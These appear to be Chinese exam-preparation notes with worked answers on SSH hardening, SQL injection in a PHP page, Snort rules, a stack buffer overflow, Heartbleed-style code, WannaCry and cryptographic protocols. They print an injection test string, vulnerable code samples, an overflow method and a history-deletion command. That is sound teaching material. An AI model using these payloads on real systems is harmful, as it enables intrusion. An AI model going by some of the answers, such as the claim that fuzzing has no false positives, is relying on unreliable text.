<p>【问题5】（2分）<br>SSH之所以可以实现安全的远程访问，归根结底还是密码技术的有效使用。对于SSH 协议，不管是李工刚开始使用的基于口令的认证还是后来的基于密钥的免密认证，都是密码 算法和密码协议在为李工的远程访问保驾护航。请问上述安全能力是基于对称密码体制还是 非对称密码体制来实现的？</p>
<p>【问题1】<br>22<br>【问题2】<br>VPN<br>【问题3】<br>（1）&#x2F;var&#x2F;log&#x2F;auth.log<br>（2）cat .&#x2F;auth.log | grep “Accepted password”<br>【问题4】<br>（1）&#x2F;etc&#x2F;ssh&#x2F;sshd_config<br>（2）追加文件内容<br>（3）600<br>（4）systemctl restart ssh<br>systemctl restart sshd<br>systemctl restart ssh.service<br>systemctl restart sshd.service<br>（5）rm ~&#x2F;.bash_history<br>【问题5】<br>非对称密码体制</p>
<p> 本题考查Linux系统基本的安全配置，要求对Linux系统SSH服务相关的端口、日志和免密登录有清晰的了解。<br>【问题1】<br>SSH服务的默认端口号是22。</p>
<p>【问题2】<br>远程安全运维的另外一种常见方法就是虚拟专用网VPN,可以直接在不安全的公网之上以隧道方式开辟安全通道。<br>【问题3】<br>Ubuntu系统中日志都位于&#x2F;var&#x2F;log目录，其中的登录认证日志都在 auth.log文件中。所谓攻击的评估，对于日志所反应的口令爆破攻击就是想知道攻击是否成功，也就是口令是否已经泄露，这可以从SSH登录成功的字符串“Accepted password”作为过滤依据，因此可以使用cat命令内容，然后用grep过滤内容的上述字符串，两个命令之间用管道符连接即可。<br>【问题4】<br>Ubuntu系统的配置基本都在&#x2F;etc目录下，ssh服务在letc&#x2F;ssh，对应的配置文件为sshd_config。</p>
<p>一个尖括号是改写原有文件中的内容，而两个尖括号则是在原有文件内容的后面进行追加。<br>上述权限字符串“rw——-”对应的就是110000000，即600。<br>最新的Linux系统服务管理程序是systemctl，其语法就是命令+动作+服务名字。<br>命令历史记录都在每个用户 home目录下的.bash_history 文件中，home目录可以用~表示，因此组合起来就是 rm ~&#x2F;.bash_history 。<br>【问题5】<br>SSH的实现是基于公钥密码体制。私钥在用户本地主机上，公钥则保存在SSH服务器上。</p>
<hr>
<h3 id="错误4-网络拓扑和编码熟悉"><a href="#错误4-网络拓扑和编码熟悉" class="headerlink" title="错误4-网络拓扑和编码熟悉"></a>错误4-网络拓扑和编码熟悉</h3><hr>
<p>在某政府单位信息中心工作的李工主要负责网站的设计、开发工作。为了确保部门新业务的顺利上线，李工邀请信息安全部的王工按照等级保护2.0的要求对其开展安全测评。李工提供网站所在的网络拓扑图如图1-1所示。图中，网站服务器的IP地址是192.168.70.140, 数据库服务器的IP地址是192.168.70.141。</p>
<p><img src="/../image/Soft-exam-intermediate/after/%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91%E5%9B%BE.png"></p>
<p>王工接到网站安全测评任务以后，决定在内网办公区的信息安全部开展各项运维工作。王工使用的办公电脑IP地址为192.168.11.2。</p>
<p>【问题1】（2分）</p>
<p>按照等级保护2.0的要求，政府网站的定级不应低于几级？该等级的测评每几年开展一次？</p>
<p>【问题2】(6分)</p>
<p>按照网络安全测评的实施方式，测评主要包括安全功能检测、安全管理检测、代码安全审查、安全渗透、信息系统攻击测试等。王工调阅了部分网站后台处理代码，发现网站某页面的数据库查询代码存在安全漏洞，代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;Submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="comment">// Retrieve data</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    <span class="variable">$getid</span> = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user id = &#x27;<span class="subst">$id</span>&#x27; &quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$getid</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;&lt;pre&gt;&#x27;</span> . <span class="title function_ invoke__">mysql_error</span>() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>);</span><br><span class="line">    <span class="variable">$num</span> = <span class="title function_ invoke__">mysql_numrows</span>(<span class="variable">$result</span>);</span><br><span class="line">    <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="variable">$i</span> &lt; <span class="variable">$num</span>)&#123;</span><br><span class="line">        <span class="variable">$first</span> = <span class="title function_ invoke__">mysql_result</span>(<span class="variable">$result</span>, <span class="variable">$i</span>, <span class="string">&quot;first_narae&quot;</span>);</span><br><span class="line">        <span class="variable">$last</span> = <span class="title function_ invoke__">mysql_result</span>(<span class="variable">$result</span>, <span class="variable">$i</span>, <span class="string">&quot;last_name&quot;</span>);</span><br><span class="line">        ehco <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;ID: &#x27;</span> . <span class="variable">$id</span> . <span class="string">&#x27;&lt;br&gt;First name: &#x27;</span>. <span class="variable">$first</span> . <span class="string">&#x27;&lt;br&gt;Surname: &#x27;</span> . <span class="variable">$last</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$i</span>++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>(1) 请问上述代码存在哪种漏洞？<br>(2) 为了进一步验证自己的判断，王工在该页面的编辑框中输入了漏洞测试语句，发起测试。请问王工最有可能输入的测试语句对应以下哪个选项？<br>A. or 1&#x3D;1– order by 1<br>B. 1 or ‘1’&#x3D;’1’&#x3D;1 order by 1#<br>C. 1’ or 1&#x3D;1 order by 1#<br>D. 1’ and ‘1’&#x3D;’2’ order by 1#</p>
<p>(3) 根据上述代码，网站后台使用的是哪种数据库系统？<br>(4) 王工对数据库中保存口令的数据表进行检查的过程中，发现口令为明文保存，遂给出整改建议，建议李工对源码进行修改，以加强口令的安全防护，降低敏感信息泄露风险。下面给出四种在数据库中保存口令信息的方法，李工应该采用哪一种口令安全实践方法？<br>A. Base64<br>B. MD5<br>C.哈希加盐<br>D.加密存储</p>
<p>【问题3】(2分)</p>
<p>按照等级保护2.0的要求，系统当中没有必要开放的服务应当尽量关闭。王工在命令行窗口运行了一条命令，端口开放情况一目了然。请给出王工所运行命令的名字。</p>
<p>【问题4】(2分)</p>
<p>防火墙是网络安全区域边界保护的重要技术，防火墙防御体系结构主要有基于双宿主主机防火墙、基于代理型防火墙和基于屏蔽子网的防火墙。图1-1拓扑图中的防火墙布局属于哪种体系结构类型？</p>
<p>【问题5】（8分）</p>
<p>根据李工提供的网络拓扑图，王工建议部署开源的Snort入侵检测系统以提高整体的安全检测和态势感知能力。</p>
<p>（1）针对王工建议，李工查阅了入侵检测系统的基本组成和技术原理等资料。请问以下有关Snort入侵检测系统的描述哪几项是正确的？（2分）<br>A.基于异常的检测系统<br>B.基于误用的检测系统<br>C.基于网络的入侵检测系统<br>D.基于主机的入侵检测系统</p>
<p>（2）为了部署Snort入侵检测系统，李工应该把入侵检测系统连接到图1-1网络拓扑中的哪台交换机？（1分）</p>
<p>（3）李工还需要把网络流量导入入侵检测系统才能识别流量中的潜在攻击。图1-1中使用的均为华为交换机，李工要将交换机网口 GigabitEthernet1&#x2F;0&#x2F;2的流量镜像到部署Snort的网口 GigabitEthernet1&#x2F;0&#x2F;1上，他应该选择下列选项中哪一个配置？ （2分）<br>A. observe-port 1 interface GigabitEthernet1&#x2F;0&#x2F;2<br>interface GigabitEthernet1&#x2F;0&#x2F;1<br>port-mirroring to observe-port 1 inbound&#x2F;outbound&#x2F;both<br>B. observe-port 2 interface GigabitEthernet1&#x2F;0&#x2F;2<br>interface GigabitEthernet1&#x2F;0&#x2F;1<br>port-mirroring to observe-port 1 inbound&#x2F;outbound&#x2F;both<br>C. port-mirroring to observe-port 1 inbound&#x2F;outbound&#x2F;both<br>observe-port 1 interface GigabitEthernet1&#x2F;0&#x2F;2 interface<br>GigabitEthernet1&#x2F;0&#x2F;1<br>D. observe-port 1 interface GigabitEthernet1&#x2F;0&#x2F;1<br>interface GigabitEthernet1&#x2F;0&#x2F;2<br>port-mirroring to observe-port 1 inbound&#x2F;outbound&#x2F;both</p>
<p>（4）Snort入侵检测系统部署不久，就发现了一起网络攻击。李工打开攻击分组查看，发现很多字符看起来不像是正常字母，如图1-2所示，请问该用哪种编码方式去解码该网络分组内容？ （1分）</p>
<p><img src="/../image/Soft-exam-intermediate/after/hex%E8%A7%A3%E6%9E%90.png"></p>
<p>（5）针对图1-2所示的网络分组，李工查看了该攻击对应的Snort检测规则，以更好地掌握Snort入侵检测系统的工作机制。请完善以下规则，填充空（a）、（b）处的内容。（2分）<br>（a） tcp any any -&gt; any any （msg:”XXX”;content:” （b） “;nocase;sid: 1106;）</p>
<p>【问题1】（2分）</p>
<p>按照等级保护2.0的要求，政府网站的定级不应低于<strong>二级</strong>。该等级的测评每<strong>两</strong>年开展一次。</p>
<p>【问题2】（6分）</p>
<p>(1) <strong>SQL注入漏洞</strong><br>(2) <strong>C. 1’ or 1&#x3D;1 order by 1#</strong><br>(3) <strong>MySQL</strong><br>(4) <strong>C. 哈希加盐</strong></p>
<p>【问题3】（2分）</p>
<p>王工运行的命令是 <strong>netstat</strong>（或 <code>netstat -an</code>）。</p>
<p>【问题4】（2分）</p>
<p>图1-1拓扑图中的防火墙布局属于<strong>基于屏蔽子网的防火墙</strong>体系结构。</p>
<p>【问题5】（8分）</p>
<p>（1）<strong>B. 基于误用的检测系统</strong> 和 <strong>C. 基于网络的入侵检测系统</strong><br>（2）应连接到<strong>交换机2</strong>（或DMZ区交换机）。<br>（3）正确配置是：<br><strong>A. observe-port 1 interface GigabitEthernet1&#x2F;0&#x2F;2<br>  interface GigabitEthernet1&#x2F;0&#x2F;1<br>  port-mirroring to observe-port 1 inbound&#x2F;outbound&#x2F;both</strong><br>（4）应使用<strong>URL编码</strong>方式解码。<br>（5）规则完善：<br>（a）<strong>alert</strong><br>（b）<strong>union</strong></p>
<p>完整规则：<br><code>alert tcp any any -&gt; any any (msg:&quot;XXX&quot;;content:&quot;union&quot;;nocase;sid:1106;)</code></p>
<h6 id="解析摘要"><a href="#解析摘要" class="headerlink" title="解析摘要"></a>解析摘要</h6><ul>
<li><strong>问题1</strong>：根据《网络安全等级保护条例》，政府网站通常定为二级或以上，二级系统每两年测评一次。</li>
<li><strong>问题2</strong>：代码中用户输入未过滤直接拼接SQL语句，导致SQL注入；测试语句需闭合引号并用<code>#</code>注释；<code>mysql_*</code>函数表明使用MySQL数据库；口令存储应采用加盐哈希增强安全性。</li>
<li><strong>问题3</strong>：<code>netstat</code>命令可查看系统开放端口和连接状态。</li>
<li><strong>问题4</strong>：拓扑中包含DMZ区（屏蔽子网），内外网间有防火墙隔离，符合屏蔽子网结构。</li>
<li><strong>问题5</strong>：Snort是基于规则（误用）和网络的IDS；需部署在DMZ交换机（交换机2）以监控外部流量；华为交换机镜像配置需先定义观察端口再应用镜像；HTTP请求中的特殊字符通常需URL解码；Snort规则中<code>alert</code>为动作类型，<code>union</code>是SQL注入常见特征。</li>
</ul>
<h2 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h2><p><strong>简明对比表</strong>：</p>
<table>
<thead>
<tr>
<th>访问控制模型</th>
<th>控制主体</th>
<th>控制对象</th>
<th>典型访问粒度</th>
<th>列级访问控制实现形式</th>
</tr>
</thead>
<tbody><tr>
<td><strong>RBAC（基于角色）</strong></td>
<td>系统管理员、角色分配者</td>
<td>资源（表、列、文件、内存页）</td>
<td>角色粒度，通常绑定用户组</td>
<td>- <strong>角色-列权限映射表</strong>：某角色可以访问哪些列- 用户通过角色继承列权限</td>
</tr>
<tr>
<td><strong>ABAC（基于属性）</strong></td>
<td>系统（自动判断）</td>
<td>资源（表、列、文件、内存页）</td>
<td>属性粒度（用户属性、环境属性、资源属性）</td>
<td>- <strong>动态列访问策略</strong>：基于属性决定访问- 条件表达式控制列访问，如“部门&#x3D;财务 AND 安全级别&gt;&#x3D;3”</td>
</tr>
<tr>
<td><strong>DAC（自主访问控制）</strong></td>
<td>资源所有者（用户）</td>
<td>自己创建的资源</td>
<td>用户粒度，可随意授权</td>
<td>- <strong>保护位（Protection Bits）</strong>：如 rwx 位标记列可读写- <strong>访问控制表（ACL, Access Control List）</strong>：列级列出允许的用户及权限</td>
</tr>
<tr>
<td><strong>MAC（强制访问控制）</strong></td>
<td>系统安全策略（不可随意更改）</td>
<td>资源（表、列、文件、内存页）</td>
<td>安全级别粒度</td>
<td>- <strong>安全标签（Security Labels）</strong>：列级标签，如 Confidential、Secret- 系统强制判断访问许可，用户无法修改</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>访问控制模型</th>
<th>形式</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>基于列的<strong>自主访问控制</strong></td>
<td>保护位、访问控制表</td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><h3 id="栈缓冲区溢出漏洞-题目"><a href="#栈缓冲区溢出漏洞-题目" class="headerlink" title="栈缓冲区溢出漏洞-题目"></a>栈缓冲区溢出漏洞-题目</h3><p>【说明】基于 Windows32 位系统分析下列代码，回答相关问题 。</p>
<p><img src="/../image/Soft-exam-intermediate/after/windows32-demo.png"></p>
<p>【问题 1】(3 分)</p>
<p>main 函数内的三个本地变量所在的内存区域称为什么?它的两个最基本操作是什么？</p>
<p>【问题 2】（3分）</p>
<p>画出buf，check，buf2 三个变量在内存的布局图。</p>
<p><img src="/../image/Soft-exam-intermediate/after/%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80.png"></p>
<p>【问题 3】（2分）</p>
<p>应该给程序提供什么样的命令行参数值（通过argv变量传递）才能使程序执行流程进入判断语句 If（check&#x3D;65）….然后调用challenge( )函数。</p>
<p>【问题4】（4分）</p>
<p>上述代码所存在的漏洞名字是什么，针对本例代码，请简要说明如何修正上述代码以修补此漏洞。</p>
<h6 id="试题分析"><a href="#试题分析" class="headerlink" title="试题分析"></a>试题分析</h6><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf2[<span class="number">16</span>];             <span class="comment">// 16字节缓冲区</span></span><br><span class="line">    <span class="type">int</span> check = <span class="number">1</span>;             <span class="comment">// 整型变量check初始化为1</span></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">8</span>];               <span class="comment">// 8字节缓冲区</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">strcpy</span>(buf2, <span class="string">&quot;Give me Key!!!&quot;</span>);  <span class="comment">// 复制字符串到buf2</span></span><br><span class="line">    <span class="built_in">strcpy</span>(buf,argv[<span class="number">1</span>]);       <span class="comment">// 将命令行第一个参数复制到buf（存在缓冲区溢出风险！）</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(check==<span class="number">65</span>) &#123;            <span class="comment">// 检查check是否等于65</span></span><br><span class="line">        Challenge(buf);        <span class="comment">// 如果等于65，调用Challenge函数</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 输出check的实际值</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Check is not 65 (%d) \n Program terminated!!\n&quot;</span>,check);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Challenge</span><span class="params">(<span class="type">char</span> *str)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> temp[<span class="number">9</span>]=&#123;<span class="number">0</span>&#125;;          <span class="comment">// 定义9字节的字符数组并初始化为0</span></span><br><span class="line">    <span class="built_in">strncpy</span>(temp,str,<span class="number">8</span>);       <span class="comment">// 从str复制最多8个字符到temp</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;temp=%s\n&quot;</span>,temp);  <span class="comment">// 打印temp的内容</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 对比</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strcmp</span>(temp, <span class="string">&quot;Please!@&quot;</span>)==<span class="number">0</span>) &#123;  <span class="comment">// 比较temp与字符串&quot;Please!@&quot;</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;KEY:*****&quot;</span>);       <span class="comment">// 如果匹配则输出KEY</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#normal</span></span><br><span class="line">输入：./program test</span><br><span class="line">输出：Check is not <span class="number">65</span> (<span class="number">1</span>) Program terminated!!</span><br><span class="line">    </span><br><span class="line"><span class="meta">#key</span></span><br><span class="line">输入：精心构造的输入使check=<span class="number">65</span>且前<span class="number">8</span>字符为<span class="string">&quot;Please!@&quot;</span></span><br><span class="line">输出：KEY:*****</span><br></pre></td></tr></table></figure>

<p>1.答案：动态存储区，分配存储空间和释放存储空间</p>
<p>3.让agrv[] 中的第9个字符是十进制数65即可。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">高地址</span><br><span class="line">+----------------+ &lt;- 栈顶（高地址）</span><br><span class="line">|                |</span><br><span class="line">|   main函数     |</span><br><span class="line">|   的返回地址    |</span><br><span class="line">|                |</span><br><span class="line">+----------------+</span><br><span class="line">|   saved ebp    |</span><br><span class="line">+----------------+</span><br><span class="line">|                |</span><br><span class="line">|   buf2[15]    |  &lt;- buf2[15] (最后一个字节)</span><br><span class="line">|   ...         |</span><br><span class="line">|   buf2[1]     |</span><br><span class="line">|   buf2[0]     |  &lt;- buf2起始地址</span><br><span class="line">+----------------+</span><br><span class="line">|                |</span><br><span class="line">|   check        |  &lt;- 4字节整数</span><br><span class="line">|                |</span><br><span class="line">+----------------+</span><br><span class="line">|                |</span><br><span class="line">|   buf[7]      |  &lt;- buf[7] (最后一个字节)</span><br><span class="line">|   ...         |</span><br><span class="line">|   buf[1]      |</span><br><span class="line">|   buf[0]      |  &lt;- buf起始地址</span><br><span class="line">+----------------+</span><br><span class="line">|                | &lt;- 栈底（低地址）</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>#攻击原理：</strong></p>
<p><strong>通过向 buf 写入超过8字节的数据，可以精确控制 check 的值</strong></p>
<p><strong>要让 check &#x3D;&#x3D; 65，需要在 buf 的8字节后写入 65 的二进制表示</strong></p>
<p>4.答案：缓冲区溢出漏洞，使用安全的strcpy函数，检测边界。</p>
<h3 id="内存泄露漏洞（心跳包）-题目"><a href="#内存泄露漏洞（心跳包）-题目" class="headerlink" title="内存泄露漏洞（心跳包）-题目"></a>内存泄露漏洞（心跳包）-题目</h3><p>阅读下列说明和C语言代码，回答问题1至问题4，将解答写在答题纸的对应栏内。</p>
<p>【说明】</p>
<p>在客户服务器通信模型中，客户端需要每隔一定时间向服务器发送数据包，以确定服务器是否掉线，服务器也能以此判断客户端是否存活，这种每隔固定时间发一次的数据包也称为心跳包。心跳包的内容没有什么特别的规定，一般都是很小的包。某系统采用的请求和应答两种类型的心跳包格式如图4-1所示。</p>
<p><img src="/../image/Soft-exam-intermediate/after/heart.png"></p>
<p>图4-1协议包格式</p>
<p>心跳包类型占1个字节，主要是请求和响应两种类型;</p>
<p>心跳包数据长度字段占2个字节，表示后续数据或者负载的长度。</p>
<p>接收端收到该心跳包后的处理函数是process_ heartbeat ()，其中参数p指向心跳包的报文数据，s是对应客户端的socket网络通信套接字。</p>
<p><img src="/../image/Soft-exam-intermediate/after/heart-c.png"></p>
<p>【问题1】（4分）</p>
<p>（1）心跳包数据长度字段的最大取值是多少？</p>
<p>（2）心跳包中的数据长度字段给出的长度值是否必须和后续的数据字段的实际长度一致？</p>
<p>【问题2】（5分）</p>
<p>（1）上述接收代码存在什么样的安全漏洞？</p>
<p>（2）该漏洞的危害是什么？</p>
<p>【问题3】（2分）</p>
<p>模糊测试（Fuzzing）是一种非常重要的信息系统安全测评方法，它是一种基于缺陷注入的自动化测试技术。请问模糊测试属于黑盒测试还是白盒测试？其测试结果是否存在误报？</p>
<p>【问题4】（4分）</p>
<p>模糊测试技术能否测试出上述代码存在的安全漏洞？为什么？</p>
<p>【问题1】（4分）</p>
<p>（1）64KB</p>
<p>（2）必须一致</p>
<p>【问题2】（5分）</p>
<p>（1）“心脏出血”漏洞；</p>
<p>（2）造成重要信息泄露。</p>
<p>【问题3】（2分）</p>
<p>（1）黑盒测试</p>
<p>（2）不存在误报</p>
<p>【问题4】（4分）</p>
<p>（1）能</p>
<p>（2）可利用黑盒测试方法，向服务器发送特定报文，通过服务器返回数据解析出报文，解析并判断是否存在“心脏出血”漏洞。</p>
<h6 id="试题分析-1"><a href="#试题分析-1" class="headerlink" title="试题分析"></a>试题分析</h6><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">process_heartbeat</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *p, SOCKET s)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> hbtype;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> payload;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *p1;</span><br><span class="line"></span><br><span class="line">    hbtype = *p++;          <span class="comment">// 读取心跳包类型（1字节）</span></span><br><span class="line">    n2s(p, payload);        <span class="comment">// 读取心跳包数据长度（2字节，网络字节序转主机字节序）</span></span><br><span class="line">    p1 = p;                 <span class="comment">// p1 指向心跳包数据部分</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hbtype == HB_REQUEST) &#123;  <span class="comment">// 如果是心跳请求包</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> *buffer, *bp;</span><br><span class="line">        buffer = <span class="built_in">malloc</span>(<span class="number">1</span> + <span class="number">2</span> + payload);  <span class="comment">// 分配内存：类型(1) + 长度(2) + 数据(payload)</span></span><br><span class="line">        bp = buffer;                       <span class="comment">// bp 指向分配的内存</span></span><br><span class="line"></span><br><span class="line">        *bp++ = HB_RESPONSE;     <span class="comment">// 写入心跳响应类型</span></span><br><span class="line">        s2n(payload, bp);        <span class="comment">// 写入数据长度（主机字节序转网络字节序）</span></span><br><span class="line">        <span class="built_in">memcpy</span>(bp, p1, payload); <span class="comment">// 将心跳请求中的数据复制到响应中</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将构造好的心跳响应包通过 socket s 返回给客户端</span></span><br><span class="line">        write_bytes(s, buffer, <span class="number">3</span> + payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>【问题1】（4分）</p>
<p>（1）心跳包数据长度字段占2个字节，表示后续数据或者负载的长度。所以心跳包数据长度字段的最大取值为2^16&#x3D;64KB</p>
<p>（2）必须一致</p>
<p>【问题2】（5分）</p>
<p>OpenSSL的心跳处理逻辑没有检测心跳包中的长度字段是否和后续的数据字段相符合,攻击者可以利用这点,构造异常的数据包,来获取心跳数据所在的内存区域的后续数据。这些数据中可能包含了证书私钥、用户名、用户密码、用户邮箱等敏感信息。该漏洞允许攻击者,从内存中读取多达64KB的数据。</p>
<p>【问题3】（2分）</p>
<p>5天修炼，8.2.4 信息系统安全测评。</p>
<p>模糊测试：属于软件测试中的黑盒测试，是一种通过向目标系统提供非预期的输入并监视异常结果来发现软件漏洞的方法。模糊测试不需要程序的源代码就可以发现问题。</p>
<p>模糊测试是一种自动化的动态漏洞挖掘技术，不存在误报，也不需要人工进行大量的逆向分析工作。</p>
<p>【问题4】（4分）</p>
<p>可利用黑盒测试方法，向服务器发送特定报文，通过服务器返回数据解析出报文，解析并判断是否存在“心脏出血”漏洞。</p>
<h2 id="恶意代码分析"><a href="#恶意代码分析" class="headerlink" title="恶意代码分析"></a>恶意代码分析</h2><p>阅读下列说明，回答问题1至问题4，将解答填入答题纸的对应栏内。</p>
<p>【说明】恶意代码是指为达到恶意目地专门设计的程序或者代码。常见的恶意代码类型有特洛伊木马、蠕虫、病毒、后门、Rootkit、僵尸程序、广告软件。2017年5月。勒索软件WanaCry席卷全球，国内大量高校及企事业单位的计算机被攻击，文件及数据被加密后无法使用，系统或服务无法正常运行，损失巨大。</p>
<p>【问题1】（2分）</p>
<p>按照恶意代码分类，此次爆发的恶意软件属于那种类型？</p>
<p>【问题2】（2分）</p>
<p>此次勒索软件针对软件攻击目标是Windows还是Linux类系统？</p>
<p>【问题3】（6分）</p>
<p>恶意代码具有的共同特征是什么？</p>
<p>【问题4】（5分）</p>
<p>由于此次勒索软件需要利用系统的SMB服务漏洞（端口号445）进行传播，我们可以配置防火墙过滤规则来阻止勒索软件的攻击，请填写表1-1中的空（1）-（5），使该过滤规则完整。</p>
<p>注：假设本机IP地址为：1.2.3.4，”*”表示通配符。</p>
<p><img src="/../image/Soft-exam-intermediate/after/%E9%98%B2%E7%81%AB%E5%A2%99%E8%BF%87%E6%BB%A4%E8%A7%84%E5%88%99%E8%A1%A8.png"></p>
<h6 id="试题分析-2"><a href="#试题分析-2" class="headerlink" title="试题分析"></a>试题分析</h6><p>【问题1】</p>
<p>WannaCry（又叫Wanna Decryptor）是一种“蠕虫式”的勒索病毒软件，大小3.3MB，由不法分子利用NSA（National Security Agency，美国国家安全局）泄露的危险漏洞“EternalBlue”（永恒之蓝）进行传播。</p>
<p>当用户主机系统被该勒索软件入侵后，弹出如下勒索对话框，提示勒索目的并向用户索要比特币。而对于用户主机上的重要文件，如：照片、图片、文档、压缩包、音频、视频、可执行程序等几乎所有类型的文件，都被加密的文件后缀名被统一修改为“.WNCRY”。目前，安全业界暂未能有效破除该勒索软的恶意加密行为，用户主机一旦被勒索软件渗透，只能通过重装操作系统的方式来解除勒索行为，但用户重要数据文件不能直接恢复。</p>
<p>【问题2】</p>
<p>WannaCry主要利用了微软“Windows”操作系统的漏洞，以获得自动传播的能力。</p>
<p>【问题3】</p>
<p>5天修炼，5.2恶意代码。</p>
<p>恶意代码的特点如下：</p>
<p>l恶意的目的；</p>
<p>l本身是计算机程序；</p>
<p>l通过执行发生作用。</p>
<p>【问题4】</p>
<p>防火墙设置就是关闭外网到内网，TCP协议445端口的连接。。</p>
<p>参考答案</p>
<p>【问题1】（2分）</p>
<p>蠕虫病毒</p>
<p>【问题2】（2分）</p>
<p>“Windows”操作系统</p>
<p>【问题3】（6分）</p>
<p>恶意代码的特点如下：</p>
<p>l恶意的目的；</p>
<p>l本身是计算机程序；</p>
<p>l通过执行发生作用。</p>
<p>【问题4】（5分）</p>
<p>（1）<em>（2）&gt;1024（或者填</em>）（3）445（4）TCP （5）*</p>
<h2 id="加密分析"><a href="#加密分析" class="headerlink" title="加密分析"></a>加密分析</h2><p>试题二</p>
<p>阅读下列说明和图，回答问题1至问题3，将解答填入答题纸的对应栏内。</p>
<p>【说明】</p>
<p>密码学的基本目标是在有攻击者存在的环境下，保证通信双方（A和B）之间能够使用不安全的通信信道实现安全通信。密码技术能够实现信息的保密性、完整性、可用性和不可否认性等安全目标。一种实用的保密通信模型往往涉及对称加密、公钥密码、Hash函数、数字签名等多种密码技术。</p>
<p>在以下描述中，M表示消息，H表示Hash函数，E表示加密算法，D表示解密算法，K表示密钥，SKA表示A的私钥，PKA表示A的公钥，SKB表示B的私钥，PKB表示B的公钥，</p>
<p>表示连接操作。</p>
<p>【问题1】（6分）</p>
<p>用户AB双方采用的保密通信的基本过程如图2-1所示。</p>
<p><img src="/../image/Soft-exam-intermediate/after/title-RSA-1.png"></p>
<p><img src="/../image/Soft-exam-intermediate/after/title-RSA.png"></p>
<p>试题分析</p>
<p>【问题1】（6分）</p>
<p>A发送给B：对消息M 做摘要，然后用密钥进行加密，然后与消息M一并发出。</p>
<p>B接受到M和加密后的摘要后，对加密信息进行解密得到H’（M）；B对接受到的M做摘要得到H（M）。如果H’（ M）&#x3D;H（M）表明M没有被篡改。</p>
<p>H和E不能否互换计算顺序，先hash摘要可以减少加密的计算量。</p>
<p>【问题2】（4分）</p>
<p>A发送给B：M消息进行hash摘要，然后与消息M一并加密。这种方式就确保了M信息的机密性。</p>
<p>B接受到加密信息后：解密信息，得到M消息和hash摘要信息；B对接受到的M做摘要得到H（M）。如果H’（ M）&#x3D; H（M）表明M没有被篡改。</p>
<p>【问题3】（5分）</p>
<p>发送过程：</p>
<p>（1）对M摘要：H（M）</p>
<p>（2）对H（M）使用A的私钥SKA签名：SKA（H（M））</p>
<p>（3）合并M和（2）的结果，并使用共享密钥K对M||SKA（H（M））加密：[M||KA（H（M））]</p>
<p>接受过程：</p>
<p>（1）使用共享密钥对接受到的信息解密，得到信息M||SKA（H（M））</p>
<p>（2）使用A的公钥PKA解密信息SKA（H（M）），得到H（M）</p>
<p>（3）对M再次进行摘要，得到H’（M）。如果H’（ M）&#x3D; H（M）表明M没有被篡改。</p>
<p>参考答案</p>
<p>【问题1】（6分）</p>
<p>保证M完整性；</p>
<p>不能互换，先hash摘要可以减少加密的计算量。</p>
<p>【问题2】（4分）</p>
<p>实现机密性、完整性。</p>
